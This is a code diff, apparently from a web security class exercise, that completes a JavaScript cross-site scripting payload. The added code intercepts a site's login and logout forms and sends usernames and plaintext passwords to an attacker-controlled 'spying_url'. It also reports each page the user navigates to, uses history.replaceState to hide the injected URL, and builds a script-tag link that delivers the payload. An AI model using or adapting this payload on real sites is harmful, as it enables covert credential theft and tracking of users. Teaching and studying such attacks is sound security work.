@@ -24,13 +24,51 @@ function payload(attacker) {
                 // Show new HTML
                 $('html').show();
 
-                // TODO implement spying while being stealthy and persistent. Remove the alert.
-                alert("Notice that although we injected code into the search page, you see here the main page!")
+                var uName = $("#logged-in-user",this).text();
+                if (uName) {
+                    var sendLink = `${spying_url}?event=nav&user=${uName}&url=${document.location.href}`;
+                    $.get(sendLink);
+                } else {
+                    var sendLink = `${spying_url}?event=nav&url=${document.location.href}`;
+                    $.get(sendLink);
+                }
 
+                // TODO implement spying while being stealthy and persistent. Remove the alert.
+                //alert("Notice that although we injected code into the search page, you see here the main page!")
+                history.replaceState(null, document.title, href)
+
+                // This is the login/register form
+                $('.well > .form-inline').submit(function(e) {
+                    e.preventDefault();
+                    //e.stopPropagation();
+                    var form = this;
+                    var uName = $("input[name='username']",this).val(); 
+                    var uPass = $("input[name='password']",this).val(); 
+                    console.log(uName,uPass);
+                    var spyLink = `${spying_url}?event=login&user=${uName}&pass=${uPass}`;
+                    console.log(spyLink);
+                    $.get(spyLink);
+                    $.post($(form).attr('action'), $(form).serialize(), function() {
+                        proxy('./', spying_url);
+                    });
+                })
+                // This is the logout form
+                $('.navbar-nav > .navbar-form').submit(function(e){
+                    e.preventDefault()
+                    var form = this;
+                    var uName = $("#logged-in-user",this).text();
+                    console.log(uName);
+                    var spyLink = `${spying_url}?event=logout&user=${uName}`;
+                    $.get(spyLink);
+                    $.post($(form).attr('action'), $(form).serialize(), function() {
+                        proxy('./', spying_url);
+                    });
+                })
+                // TODO: This is the search form
             });
     	}
     //Call Proxy
-	proxy('./', attacker)
+    proxy('./', attacker)
 }
 
 function makeLink(target, attacker, defense) {
@@ -48,7 +86,7 @@ function makeLink(target, attacker, defense) {
                 encodeURIComponent(
                     "<script>" +
                     payload_string + 
-                    ";payload();" + 
+                    ";payload('"+attacker+"');" + 
                     "</script" + ">"
                 );
         case 3:
